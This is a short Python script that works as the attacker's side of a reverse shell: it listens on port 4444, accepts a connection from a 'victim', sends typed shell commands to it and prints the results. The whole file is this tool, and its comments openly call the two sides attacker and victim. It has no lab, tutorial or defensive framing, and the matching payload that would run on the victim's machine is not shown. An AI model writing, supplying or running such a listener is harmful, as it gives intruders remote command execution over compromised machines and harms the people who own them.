import socket
import sys

# Configuration
HOST = "0.0.0.0"  # Listen on all local network interfaces
PORT = 4444       # A classic penetration testing port

# Create socket listener
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(1)

print(f"[*] Attacker listener started on port {PORT}. Waiting for target connection...")

# Accept the incoming connection from the victim
client_socket, client_address = server.accept()
print(f"[+] Connection established from {client_address[0]}:{client_address[1]}!")

try:
    while True:
        # Prompt the attacker for a terminal command
        command = input("Shell> ")
        
        if not command.strip():
            continue
            
        # Send command to the victim
        client_socket.send(command.encode())
        
        if command.lower() == "exit":
            break
            
        # Receive the execution results from the victim
        response = client_socket.recv(4096).decode()
        print(response)

except KeyboardInterrupt:
    print("\n[-] Exiting listener.")
finally:
    client_socket.close()
    server.close()
